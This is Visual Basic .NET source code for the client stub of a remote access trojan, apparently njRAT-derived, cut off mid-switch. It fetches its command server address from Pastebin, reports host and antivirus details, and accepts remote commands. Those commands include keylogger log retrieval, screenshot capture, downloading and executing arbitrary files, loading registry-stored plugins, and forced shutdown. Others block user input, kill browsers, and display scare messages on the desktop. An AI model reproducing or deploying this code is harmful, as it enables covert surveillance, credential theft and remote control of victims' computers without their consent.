Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports System.Environment
Imports Stub
Imports System.Collections

Namespace j
    <StandardModule()>
    Friend NotInheritable Class OK
        ' Methods
        <DebuggerStepThrough(), CompilerGenerated()>
        Private Shared Sub _Lambda__1(ByVal a0 As Object)
            OK.Ind(DirectCast(a0, Byte()))
        End Sub

        <DebuggerStepThrough(), CompilerGenerated()>
        Private Shared Sub _Lambda__2(ByVal a0 As Object, ByVal a1 As SessionEndingEventArgs)
            OK.ED()
        End Sub

        Public Shared Function Replace(oldValue As [String], newValue As [String]) As [String]

        End Function

        Dim MouseThread As Thread = New Thread(New ThreadStart(AddressOf Mouse))

        Private Shared Sub Mouse()
            Dim MouseThread As Thread = New Thread(New ThreadStart(AddressOf Mouse))

            ' MessageBox.Show(" Mouse Thread Started")
            'DEBUG
            Dim xxx As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim ooo As Integer = Screen.PrimaryScreen.Bounds.Height

            For x As Integer = 1 To 100


                Dim generator As New Random
                Dim randomValue As Integer
                Dim randomValue2 As Integer
                'randomValue = generator.Next(0, My.Computer.Screen.Bounds.Size.Height)
                'OLD
                randomValue = generator.Next(0, ooo)
                'randomValue2 = generator.Next(0, My.Computer.Screen.Bounds.Size.Width)
                'OLD
                randomValue2 = generator.Next(0, xxx)
                Dim mousepos As Point
                mousepos.X = randomValue
                mousepos.Y = randomValue2
                Windows.Forms.Cursor.Position = mousepos
                Threading.Thread.Sleep(50)

            Next

            MouseThread.Abort()

            'End While
        End Sub

        Dim CrazyThread As Thread = New Thread(New ThreadStart(AddressOf Crazy))

        Private Shared Sub Crazy()
            ' MessageBox.Show(" Mouse Thread Started")
            'DEBUG
            Dim CrazyThread As Thread = New Thread(New ThreadStart(AddressOf Crazy))

            ' MessageBox.Show(" Mouse Thread Started")
            'DEBUG

            For x As Integer = 1 To 100
                HorrorText()
                HorrorText()
                HorrorText()
                HorrorText()
                HorrorText()
                HorrorText()
                HorrorText()
                HorrorText()
                HorrorText()
                HorrorText()
                HorrorText()
                HorrorText()
            Next

            CrazyThread.Abort()
        End Sub

        Dim bThread As Thread = New Thread(New ThreadStart(AddressOf bac))

        Private Shared Sub bac()
            ' MessageBox.Show(" Mouse Thread Started")
            'DEBUG
            Dim bThread As Thread = New Thread(New ThreadStart(AddressOf bac))

            ' MessageBox.Show(" Mouse Thread Started")
            'DEBUG

            If OK.nowifi = "on" Then


                Dim process As Process
                For Each process In Process.GetProcessesByName("Chrome")
                    ProjectData.EndApp()
                Next


                Dim process2 As Process
                For Each process2 In Process.GetProcessesByName("Firefox")
                    ProjectData.EndApp()
                Next


                Dim process3 As Process
                For Each process3 In Process.GetProcessesByName("Opera")
                    ProjectData.EndApp()
                Next


                Dim process4 As Process
                For Each process4 In Process.GetProcessesByName("OperaGX")
                    ProjectData.EndApp()
                Next


                Dim process5 As Process
                For Each process5 In Process.GetProcessesByName("Palemoon")
                    ProjectData.EndApp()
                Next


                Dim process6 As Process
                For Each process6 In Process.GetProcessesByName("Brave")
                    ProjectData.EndApp()
                Next


                Dim process7 As Process
                For Each process7 In Process.GetProcessesByName("Tor")
                    ProjectData.EndApp()
                Next


                Dim process8 As Process
                For Each process8 In Process.GetProcessesByName("Vivaldi")
                    ProjectData.EndApp()
                Next


                Dim process9 As Process
                For Each process9 In Process.GetProcessesByName("Dissenter")
                    ProjectData.EndApp()
                Next


                Dim process10 As Process
                For Each process10 In Process.GetProcessesByName("iExplore")
                    ProjectData.EndApp()
                Next


                Dim process11 As Process
                For Each process11 In Process.GetProcessesByName("Iridium")
                    ProjectData.EndApp()
                Next


                Dim process12 As Process
                For Each process12 In Process.GetProcessesByName("Safari")
                    ProjectData.EndApp()
                Next


                Dim process15 As Process
                For Each process15 In Process.GetProcessesByName("MsEdge")
                    ProjectData.EndApp()
                Next

                Dim process16 As Process
                For Each process16 In Process.GetProcessesByName("Chromium")
                    ProjectData.EndApp()
                Next

                Dim process17 As Process
                For Each process17 In Process.GetProcessesByName("Avant")
                    ProjectData.EndApp()
                Next

                Dim process18 As Process
                For Each process18 In Process.GetProcessesByName("Slimbrowser")
                    ProjectData.EndApp()
                Next

                Dim process19 As Process
                For Each process19 In Process.GetProcessesByName("QtWeb")
                    ProjectData.EndApp()
                Next

                Dim process20 As Process
                For Each process20 In Process.GetProcessesByName("OperaMini")
                    ProjectData.EndApp()
                Next

                Threading.Thread.Sleep(50)

            Else

                bThread.Abort()

            End If


        End Sub

        Public Shared Function HorrorText() As String

            '

            Dim r As New Random()
            Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
            Using G = Graphics.FromHwnd(GetDesktopWindow)
                'Using drawFont As New System.Drawing.Font("Arial", GetRandom(10, 70))
                'Regular Way


                Dim Hdc As IntPtr
                Dim FontPtr As IntPtr
                Dim rndtext As String() = {"Time to format", "I am in your Computer", "OMG", "Erasing files", "Your system is now mine"}
                Dim drawFont As Font = New Font("Arial", r.[Next](10, 70))
                Dim drawBrush As SolidBrush = New SolidBrush(Color.Red)
                Dim xp As Integer = r.[Next](Screen.PrimaryScreen.Bounds.Width)
                Dim yp As Integer = r.[Next](y)
                Dim drawFormat As StringFormat = New StringFormat()
                drawFormat.FormatFlags = StringFormatFlags.DirectionRightToLeft

                If r.[Next](5) = 0 Then
                    G.DrawString(rndtext(r.[Next](4)), drawFont, drawBrush, xp, yp, drawFormat)

                    ' Threading.Thread.Sleep(200)
                End If
            End Using
        End Function

        Public Shared Function ACT() As String
            Dim str As String
            Try
                Dim foregroundWindow As IntPtr = OK.GetForegroundWindow
                If (foregroundWindow = IntPtr.Zero) Then
                    Return ""
                End If
                Dim winTitle As String = Strings.Space((OK.GetWindowTextLength(CLng(foregroundWindow)) + 1))
                OK.GetWindowText(foregroundWindow, winTitle, winTitle.Length)
                str = OK.ENB(winTitle)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str = ""
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function

        Public Shared Function BS(ByRef B As Byte()) As String
            Return Encoding.UTF8.GetString(B)
        End Function

        Public Shared Function Cam() As Boolean
            Try
                Dim num As Integer = 0
                Do
                    Dim lpszVer As String = Nothing
                    If OK.capGetDriverDescriptionA(CShort(num), Strings.Space(100), 100, lpszVer, 100) Then
                        Return True
                    End If
                    num += 1
                Loop While (num <= 4)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Return False
        End Function


        <DllImport("user32.dll", EntryPoint:="BlockInput")>
        Private Shared Function BlockInput(<MarshalAs(UnmanagedType.Bool)> ByVal fBlockIt As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function capGetDriverDescriptionA(ByVal wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
        End Function

        Private Shared Function CompDir(ByVal F1 As FileInfo, ByVal F2 As FileInfo) As Boolean
            If (F1.Name.ToLower = F2.Name.ToLower) Then
                Dim directory As DirectoryInfo = F1.Directory
                Dim parent As DirectoryInfo = F2.Directory
                Do
                    If (directory.Name.ToLower <> parent.Name.ToLower) Then
                        Return False
                    End If
                    directory = directory.Parent
                    parent = parent.Parent
                    If ((directory Is Nothing) And (parent Is Nothing)) Then
                        Return True
                    End If
                    If (directory Is Nothing) Then
                        Return False
                    End If
                Loop While (Not parent Is Nothing)
            End If
            Return False
        End Function

        Public Shared Function connect() As Boolean

            'pastebin connection (downloads from raw and splits host:prort for connection
            If PASTEE = "Enabled" Then
                Dim str As String
                Dim strArr() As String
                Dim count As Integer
                str = New WebClient().DownloadString(PASTEBIN)
                strArr = str.Split(":")
                For count = 0 To strArr.Length - 1
                    OK.H = strArr(0)
                    OK.P = strArr(1)


                Next
            Else
            End If

            OK.Cn = False
            Thread.Sleep(&H7D0)
            Dim lO As FileInfo = OK.LO
            SyncLock lO
                Try
                    If (Not OK.C Is Nothing) Then
                        Try
                            OK.C.Close()
                            OK.C = Nothing
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    Try
                        OK.MeM.Dispose()
                    Catch exception6 As Exception
                        ProjectData.SetProjectError(exception6)
                        Dim exception2 As Exception = exception6
                        ProjectData.ClearProjectError()
                    End Try
                Catch exception7 As Exception
                    ProjectData.SetProjectError(exception7)
                    Dim exception3 As Exception = exception7
                    ProjectData.ClearProjectError()
                End Try
                Try
                    OK.MeM = New MemoryStream
                    OK.C = New TcpClient
                    OK.C.ReceiveBufferSize = &H32000
                    OK.C.SendBufferSize = &H32000
                    OK.C.Client.SendTimeout = &H2710
                    OK.C.Client.ReceiveTimeout = &H2710

                    OK.C.Connect((OK.H), Conversions.ToInteger(OK.P))

                    OK.Cn = True
                    OK.Send(OK.inf)
                    Try
                        Dim str As String
                        If Operators.ConditionalCompareObjectEqual(OK.GTV("vn", ""), "", False) Then
                            str = (str & OK.DEB(OK.VN) & ChrW(13) & ChrW(10))
                        Else
                            str = (str & OK.DEB(Conversions.ToString(OK.GTV("vn", ""))) & ChrW(13) & ChrW(10))
                        End If
                        str = ((((((String.Concat(New String() {str, (OK.H), ":", OK.P, ChrW(13) & ChrW(10)}) & OK.DR & ChrW(13) & ChrW(10)) & OK.EXE & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.Idr) & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.IsF) & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.Isu) & ChrW(13) & ChrW(10)) & Conversions.ToString(OK.BD))
                        OK.Send(("inf" & OK.Y & OK.ENB(str)))
                    Catch exception8 As Exception
                        ProjectData.SetProjectError(exception8)
                        Dim exception4 As Exception = exception8
                        ProjectData.ClearProjectError()
                    End Try
                Catch exception9 As Exception
                    ProjectData.SetProjectError(exception9)
                    Dim exception5 As Exception = exception9
                    OK.Cn = False
                    ProjectData.ClearProjectError()
                End Try
            End SyncLock
            Return OK.Cn
        End Function

        Public Shared Function DEB(ByRef s As String) As String
            Return OK.BS(Convert.FromBase64String(s))
        End Function

        Public Shared Sub DLV(ByVal n As String)
            Try
                OK.F.Registry.CurrentUser.OpenSubKey(("Software\" & OK.RG), True).DeleteValue(n)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Sub ED()
            OK.pr(0)
        End Sub

        Public Shared Function ENB(ByRef s As String) As String
            Return Convert.ToBase64String(OK.SB(s))
        End Function

        <DllImport("user32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function GetForegroundWindow() As IntPtr
        End Function

        <DllImport("kernel32", EntryPoint:="GetVolumeInformationA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Private Shared Function GetVolumeInformation(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
        End Function

        <DllImport("user32.dll", EntryPoint:="GetWindowTextA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function GetWindowText(ByVal hWnd As IntPtr, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef WinTitle As String, ByVal MaxLength As Integer) As Integer
        End Function


        Public Shared Function GetAntiVirus() As String
            '' By AFHJQ
            Dim AV As String
            Dim fir As Integer
            Try
                Dim Sec As Integer
                Dim Thr As Integer
one:
                Thr = 1
                Dim obj4 As Object = "Select * From AntiVirusProduct"
two:
                Thr = 2
                Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\.\root\SecurityCenter2", Nothing))
thr:
                Thr = 3
                Dim arguments As Object() = New Object() {RuntimeHelpers.GetObjectValue(obj4)}
                Dim copyBack As Boolean() = New Boolean() {True}
                If copyBack(0) Then
                    obj4 = RuntimeHelpers.GetObjectValue(arguments(0))
                End If
                Dim Obf As Object = RuntimeHelpers.GetObjectValue(Microsoft.VisualBasic.CompilerServices.NewLateBinding.LateGet(objectValue, Nothing, "ExecQuery", arguments, Nothing, Nothing, copyBack))
tori:
                Thr = 4
                Dim enumerator As IEnumerator = DirectCast(Obf, IEnumerable).GetEnumerator
                Do While enumerator.MoveNext
                    Dim instance As Object = RuntimeHelpers.GetObjectValue(enumerator.Current)
fiv:

                    Sec = 1
sx:
                    Thr = 6
                    AV = Microsoft.VisualBasic.CompilerServices.NewLateBinding.LateGet(instance, Nothing, "displayName", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString
                    GoTo Label_015D
sve:
                    Thr = 7
                Loop
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
nime:
                Thr = 8
                AV = "No AV"
                GoTo Label_015D
ly:
                fir = 0
                Select Case (fir + 1)
                    Case 1
                        GoTo one
                    Case 2
                        GoTo two
                    Case 3
                        GoTo thr
                    Case 4
                        GoTo tori
                    Case 5
                        GoTo fiv
                    Case 6
                        GoTo sx
                    Case 7
                        GoTo sve
                    Case 8
                        GoTo nime
                    Case 9
                        GoTo Label_015D
                    Case Else
                        GoTo Label_0152
                End Select
Label_011B:
                fir = Thr
                Select Case Sec
                    Case 0
                        GoTo Label_0152
                    Case 1
                        GoTo ly
                End Select
            Catch ex As Exception

                GoTo Label_011B
            End Try
Label_0152:

Label_015D:
            If (fir <> 0) Then

            End If
            Return AV

        End Function


        <DllImport("user32.dll", EntryPoint:="GetWindowTextLengthA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function GetWindowTextLength(ByVal hwnd As Long) As Integer
        End Function

        Private Enum SW As Int32
            Hide = 0
            Normal = 1
            ShowMinimized = 2
            ShowMaximized = 3
            ShowNoActivate = 4
            Show = 5
            Minimize = 6
            ShowMinNoActive = 7
            ShowNA = 8
            Restore = 9
            ShowDefault = 10
            ForceMinimize = 11
            Max = 11
        End Enum

        Private Enum GetWindow_Cmd As UInteger
            GW_HWNDFIRST = 0
            GW_HWNDLAST = 1
            GW_HWNDNEXT = 2
            GW_HWNDPREV = 3
            GW_OWNER = 4
            GW_CHILD = 5
            GW_ENABLEDPOPUP = 6
        End Enum


        <DllImport("user32.dll", SetLastError:=True)>
        Private Shared Function GetWindow(ByVal hWnd As IntPtr, ByVal uCmd As GetWindow_Cmd) As IntPtr
        End Function

        <DllImport("user32.dll", CharSet:=CharSet.Auto)>
        Private Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As UInt32, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
        End Function



        Private Const WM_COMMAND As Integer = &H111

        Private Shared Sub ToggleDesktopIcons()
            Dim toggleDesktopCommand = New IntPtr(&H7402)
            Dim hWnd As IntPtr = GetWindow(FindWindow("Progman", "Program Manager"), GetWindow_Cmd.GW_CHILD)
            SendMessage(hWnd, WM_COMMAND, toggleDesktopCommand, IntPtr.Zero)
        End Sub

        Public Shared Function GTV(ByVal n As String, ByVal ret As Object) As Object
            Dim obj2 As Object
            Try
                obj2 = OK.F.Registry.CurrentUser.OpenSubKey(("Software\" & OK.RG)).GetValue(n, RuntimeHelpers.GetObjectValue(ret))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                obj2 = ret
                ProjectData.ClearProjectError()
            End Try
            Return obj2
        End Function

        Public Shared Function HWD() As String
            Dim str As String
            Try
                Dim num As Integer
                Dim lpVolumeNameBuffer As String = Nothing
                Dim lpMaximumComponentLength As Integer = 0
                Dim lpFileSystemFlags As Integer = 0
                Dim lpFileSystemNameBuffer As String = Nothing
                OK.GetVolumeInformation((Interaction.Environ("SystemDrive") & "\"), lpVolumeNameBuffer, 0, num, lpMaximumComponentLength, lpFileSystemFlags, lpFileSystemNameBuffer, 0)
                str = Conversion.Hex(num)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str = "ERR"
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function

        <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
        Private Shared Function FindWindow(
        ByVal lpClassName As String,
        ByVal lpWindowName As String) As IntPtr
        End Function

        <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
        Private Shared Function ShowWindow(
        ByVal hwnd As IntPtr,
        ByVal nCmdShow As Int32) As Boolean
        End Function

        <DllImport("winmm.dll")>
        Private Shared Function mciSendString(ByVal command As String, ByVal buffer As String, ByVal bufferSize As Integer, ByVal hwndCallback As IntPtr) As Integer
        End Function

        <DllImport("user32.dll")>
        Private Shared Function ReleaseDC(ByVal hWnd As IntPtr, ByVal hDC As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("gdi32.dll")>
        Private Shared Function CreateSolidBrush(crColor As UInteger) As IntPtr
        End Function


        <DllImport("KERNEL32.DLL")>
        Public Shared Sub Beep(ByVal freq As Integer, ByVal dur As Integer)

        End Sub

        <DllImport("gdi32.dll")>
        Private Shared Function PatBlt(hdc As IntPtr, nXLeft As Integer, nYLeft As Integer, nWidth As Integer, nHeight As Integer, dwRop As TernaryRasterOperations) As Boolean
        End Function


        <DllImport("gdi32.dll", EntryPoint:="BitBlt", SetLastError:=True,
CharSet:=CharSet.Unicode, ExactSpelling:=True,
CallingConvention:=CallingConvention.StdCall)>
        Public Shared Function BitBlt(
ByVal hdcDest As IntPtr,
ByVal nXDest As Integer,
ByVal nYDest As Integer,
ByVal nWidth As Integer,
ByVal nHeight As Integer,
ByVal hdcSrc As IntPtr,
ByVal nXSrc As Integer,
ByVal nYSrc As Integer,
ByVal dwRop As Int32)
        End Function


        <DllImport("gdi32.dll")>
        Private Shared Function StretchBlt(ByVal hdcDest As IntPtr, ByVal nXOriginDest As Integer, ByVal nYOriginDest As Integer, ByVal nWidthDest As Integer, ByVal nHeightDest As Integer, ByVal hdcSrc As IntPtr, ByVal nXOriginSrc As Integer, ByVal nYOriginSrc As Integer, ByVal nWidthSrc As Integer, ByVal nHeightSrc As Integer, ByVal dwRop As TernaryRasterOperations) As Boolean

        End Function


        <DllImport("user32.dll")>
        Private Shared Function GetDesktopWindow() As IntPtr

        End Function

        <DllImport("user32.dll")>
        Private Shared Function GetWindowDC(ByVal hWnd As IntPtr) As IntPtr

        End Function

        <DllImport("gdi32")>
        Private Shared Function SelectObject(ByVal hdc As IntPtr, ByVal hgdiobj As IntPtr) As IntPtr
        End Function

        <DllImport("gdi32")>
        Private Shared Function DeleteObject(ByVal objectHandle As IntPtr) As Boolean
        End Function


        Private Const SRCCOPY = &HCC0020 ' (DWORD) dest = source

        Public Enum TernaryRasterOperations
            SRCCOPY = &HCC0020
            SRCPAINT = &HEE0086
            SRCAND = &H8800C6
            SRCINVERT = &H660046
            SRCERASE = &H440328
            NOTSRCCOPY = &H330008
            NOTSRCERASE = &H1100A6
            MERGECOPY = &HC000CA
            MERGEPAINT = &HBB0226
            PATCOPY = &HF00021
            PATPAINT = &HFB0A09
            PATINVERT = &H5A0049
            DSTINVERT = &H550009
            BLACKNESS = &H42
            WHITENESS = &HFF0062
        End Enum

        Private r As Random


        Public Shared Sub Ind(ByVal b As Byte())
            Dim strArray As String() = Strings.Split(OK.BS(b), OK.Y, -1, CompareMethod.Binary)
            Try
                Dim buffer As Byte()
                Dim str4 As String = strArray(0)
                Select Case str4

                    Case "ll"
                        OK.Cn = False
                        Return
                    Case "kl"
                        OK.Send(("kl" & OK.Y & OK.ENB(OK.kq.Logs)))
                        Return
                    Case "clip"
                        OK.Send("clip")
                        Return
                    Case "fun"
                        OK.Send("fun")
                        Return


                    Case "spech" 'speech

                        Dim dangervoice = CreateObject("SAPI.spvoice")
                        dangervoice.speak(String.Concat(New String() {strArray(1)}))

                    Case "webs" 'open website
                        Dim uchicha As String = (String.Concat(New String() {strArray(1)}))
                        Process.Start(uchicha)

                    Case "setcl" 'set clipboard
                        Try
                            Clipboard.SetText(strArray(1))
                        Catch ex As Exception
                        End Try





                    Case "message" 'messagebox
                        MsgBox(String.Concat(New String() {strArray(1)}), vbCritical, String.Concat(New String() {strArray(2)}))

                        Return
                    Case "prof"
                        Select Case strArray(1)
                            Case "~"
                                OK.STV(strArray(2), strArray(3), RegistryValueKind.String)
                                Exit Select
                            Case "!"
                                OK.STV(strArray(2), strArray(3), RegistryValueKind.String)
                                OK.Send(Conversions.ToString(Operators.ConcatenateObject((("getvalue" & OK.Y) & strArray(1) & OK.Y), OK.GTV(strArray(1), ""))))
                                Exit Select
                            Case "@"
                                OK.DLV(strArray(2))
                                Exit Select
                        End Select
                        Return
                End Select
                If (str4 <> "rn") Then
                    GoTo Label_0294
                End If
                If (strArray(2).Chars(0) = ChrW(31)) Then
                    Try
                        Dim stream As New MemoryStream
                        Dim length As Integer = (strArray(0) & OK.Y & strArray(1) & OK.Y).Length
                        stream.Write(b, length, (b.Length - length))
                        buffer = OK.ZIP(stream.ToArray)
                        GoTo Label_020B
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Dim exception As Exception = exception1
                        OK.Send(("MSG" & OK.Y & "Execute ERROR"))
                        OK.Send("bla")
                        ProjectData.ClearProjectError()
                        Return
                    End Try
                End If
                Dim client As New WebClient
                Try
                    buffer = client.DownloadData(strArray(2))
                Catch exception10 As Exception
                    ProjectData.SetProjectError(exception10)
                    Dim exception2 As Exception = exception10
                    OK.Send(("MSG" & OK.Y & "Download ERROR"))
                    OK.Send("bla")
                    ProjectData.ClearProjectError()
                    Return
                End Try
Label_020B:
                OK.Send("bla")
                Randomize()
                Dim path As String = (IO.Path.GetTempPath & Guid.NewGuid.ToString().Replace("-", "") & "." & strArray(1))
                Try
                    File.WriteAllBytes(path, buffer)
                    Process.Start(path)
                    OK.Send(("MSG" & OK.Y & "Executed As " & New FileInfo(path).Name))
                    Return
                Catch exception11 As Exception
                    ProjectData.SetProjectError(exception11)
                    Dim exception3 As Exception = exception11
                    OK.Send(("MSG" & OK.Y & "Execute ERROR " & exception3.Message))
                    ProjectData.ClearProjectError()
                    Return
                End Try

Label_0294:
                Select Case str4
                    Case "inv"
                        Dim t As Byte() = DirectCast(OK.GTV(strArray(1), New Byte(0 - 1) {}), Byte())
                        If ((strArray(3).Length < 10) And (t.Length = 0)) Then
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(1)}))
                        Else
                            If (strArray(3).Length > 10) Then
                                Dim stream2 As New MemoryStream
                                Dim offset As Integer = String.Concat(New String() {strArray(0), OK.Y, strArray(1), OK.Y, strArray(2), OK.Y}).Length
                                stream2.Write(b, offset, (b.Length - offset))
                                t = OK.ZIP(stream2.ToArray)
                                OK.STV(strArray(1), t, RegistryValueKind.Binary)
                            End If
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(0)}))
                            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(OK.Plugin(t, "A"))
                            NewLateBinding.LateSet(objectValue, Nothing, "h", New Object() {(OK.H)}, Nothing, Nothing)
                            NewLateBinding.LateSet(objectValue, Nothing, "p", New Object() {OK.P}, Nothing, Nothing)
                            NewLateBinding.LateSet(objectValue, Nothing, "osk", New Object() {strArray(2)}, Nothing, Nothing)
                            NewLateBinding.LateCall(objectValue, Nothing, "start", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                            Do While Not Conversions.ToBoolean(Operators.OrObject(Not OK.Cn, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, Nothing, "Off", New Object(0 - 1) {}, Nothing, Nothing, Nothing), True, False)))
                                Thread.Sleep(1)
                            Loop
                            NewLateBinding.LateSet(objectValue, Nothing, "off", New Object() {True}, Nothing, Nothing)
                        End If
                        Return
                    Case "ret"
                        Dim buffer3 As Byte() = DirectCast(OK.GTV(strArray(1), New Byte(0 - 1) {}), Byte())
                        If ((strArray(2).Length < 10) And (buffer3.Length = 0)) Then
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(1)}))
                        Else
                            If (strArray(2).Length > 10) Then
                                Dim stream3 As New MemoryStream
                                Dim num3 As Integer = (strArray(0) & OK.Y & strArray(1) & OK.Y).Length
                                stream3.Write(b, num3, (b.Length - num3))
                                buffer3 = OK.ZIP(stream3.ToArray)
                                OK.STV(strArray(1), buffer3, RegistryValueKind.Binary)
                            End If
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(0)}))
                            Dim instance As Object = RuntimeHelpers.GetObjectValue(OK.Plugin(buffer3, "A"))
                            OK.Send(String.Concat(New String() {"ret", OK.Y, strArray(1), OK.Y, OK.ENB(Conversions.ToString(NewLateBinding.LateGet(instance, Nothing, "GT", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))}))
                        End If
                        Return
                    Case "CAP"
                        Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
                        Dim image As New Bitmap(Screen.PrimaryScreen.Bounds.Width, bounds.Height, PixelFormat.Format16bppRgb555)
                        Dim g As Graphics = Graphics.FromImage(image)
                        Dim blockRegionSize As New Size(image.Width, image.Height)
                        g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy)
                        Try
                            blockRegionSize = New Size(&H20, &H20)
                            bounds = New Rectangle(Cursor.Position, blockRegionSize)
                            Cursors.Default.Draw(g, bounds)
                        Catch exception12 As Exception
                            ProjectData.SetProjectError(exception12)
                            Dim exception4 As Exception = exception12
                            ProjectData.ClearProjectError()
                        End Try
                        g.Dispose()
                        Dim bitmap2 As New Bitmap(Conversions.ToInteger(strArray(1)), Conversions.ToInteger(strArray(2)))
                        g = Graphics.FromImage(bitmap2)
                        g.DrawImage(image, 0, 0, bitmap2.Width, bitmap2.Height)
                        g.Dispose()
                        Dim stream4 As New MemoryStream
                        b = OK.SB(("CAP" & OK.Y))
                        stream4.Write(b, 0, b.Length)
                        Dim stream5 As New MemoryStream
                        bitmap2.Save(stream5, ImageFormat.Jpeg)
                        Dim str2 As String = OK.md5(stream5.ToArray)
                        If (str2 <> OK.lastcap) Then
                            OK.lastcap = str2
                            stream4.Write(stream5.ToArray, 0, CInt(stream5.Length))
                        Else
                            stream4.WriteByte(0)
                        End If
                        OK.Sendb(stream4.ToArray)
                        stream4.Dispose()
                        stream5.Dispose()
                        image.Dispose()
                        bitmap2.Dispose()
                        '' Case "FUCK"
                      ''  Return



                    Case "un"
                        Select Case strArray(1)
                            Case "~"
                                OK.UNS()
                                Exit Select
                            Case "!"
                                OK.pr(0)
                                ProjectData.EndApp()
                                Exit Select
                            Case "@"
                                OK.pr(0)
                                Process.Start(OK.LO.FullName)
                                ProjectData.EndApp()
                                Exit Select

                                'begin custom commandse

                            Case "S"
                                Interaction.Shell(("cmd /c start shutdown /s /f /t 0"), AppWinStyle.Hide, True, &H1388)
                                Exit Select

                            Case "R"
                                Interaction.Shell(("cmd /c start shutdown /r /f /t 0"), AppWinStyle.Hide, True, &H1388)
                                Exit Select

                            Case "L"
                                Interaction.Shell(("cmd /c start shutdown /l /f"), AppWinStyle.Hide, True, &H1388)
                                Exit Select

                            Case "W7"
                                Dim tasp As New AntiTaskManager
                                Dim xstp As New Threading.Thread(AddressOf tasp.protect)
                                xstp.Start()
                                Exit Select

                            Case "W1"
                                '' xMyAntiProcess.Start()
                                xma.Start()
                                Exit Select

                            Case "XB"
                                BlockInput(True)
                                Exit Select

                            Case "HT" ''hjode taksbar
                                Dim hWnd As IntPtr = FindWindow("Shell_TrayWnd", Nothing)
                                ShowWindow(hWnd, SW.Hide)
                                Exit Select

                            Case "ST" ''showtkasber
                                Dim hWnd As IntPtr = FindWindow("Shell_TrayWnd", Nothing)
                                ShowWindow(hWnd, SW.ShowNoActivate)
                                Exit Select

                            Case "HD" ''hidfe desktop
                                Dim hWnd As IntPtr = FindWindow("Progman", Nothing)
                                ShowWindow(hWnd, SW.Hide)
                                Exit Select

                            Case "SD" ''show desotp
                                Dim hWnd As IntPtr = FindWindow("Progman", Nothing)
                                ShowWindow(hWnd, SW.ShowNoActivate)
                                Exit Select

                            Case "hideico" ''show desotp
                                Dim hWnd As IntPtr = FindWindow("Progman", Nothing)
                                ShowWindow(hWnd, SW.ShowNoActivate)
                                Exit Select

                            Case "showico" ''show desotp
                                Dim hWnd As IntPtr = FindWindow("Progman", Nothing)
                                ShowWindow(hWnd, SW.ShowNoActivate)
                                Exit Select


                            Case "OC"
                                mciSendString("set CDAudio door open", vbNullString, 0, IntPtr.Zero)
                                Exit Select

                            Case "CD"
